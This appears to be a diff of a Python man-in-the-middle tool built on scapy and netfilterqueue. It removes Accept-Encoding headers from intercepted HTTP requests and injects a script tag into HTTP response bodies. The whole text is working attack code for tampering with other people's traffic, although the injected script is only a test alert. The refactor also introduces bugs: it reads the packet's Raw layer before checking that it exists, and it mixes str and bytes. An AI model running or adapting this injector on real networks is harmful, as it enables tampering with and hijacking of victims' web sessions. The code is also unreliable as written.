@@ -5,6 +5,7 @@ import netfilterqueue
 import re
 
 
+
 def set_load(packet,payload):
     packet[scapy.Raw].load = payload
     del packet[scapy.IP].len
@@ -15,17 +16,19 @@ def set_load(packet,payload):
 
 def process_packet(pkt):
     scapy_packet = scapy.IP(pkt.get_payload())
+    load = scapy_packet[scapy.Raw].load
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] HTTP Request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load.decode('utf-8'))
-            new_packet = set_load(scapy_packet, modified_load)
-            pkt.set_payload(bytes(new_packet))
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load.decode('utf-8'))
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Response")
-            modified_load = bytes(scapy_packet[scapy.Raw].load.replace(b"<body>", b"<script>alert('test')</script><body>"))
-            new_packet = set_load(scapy_packet, modified_load)
-            pkt.set_payload(bytes(new_packet))
+            load = bytes(load.replace(b"<body>", b"<script>alert('test')</script><body>"))
+
+    if load != scapy_packet[scapy.Raw].load:
+        new_packet = set_load(scapy_packet, load)
+        pkt.set_payload(bytes(new_packet))
 
     pkt.accept()
 
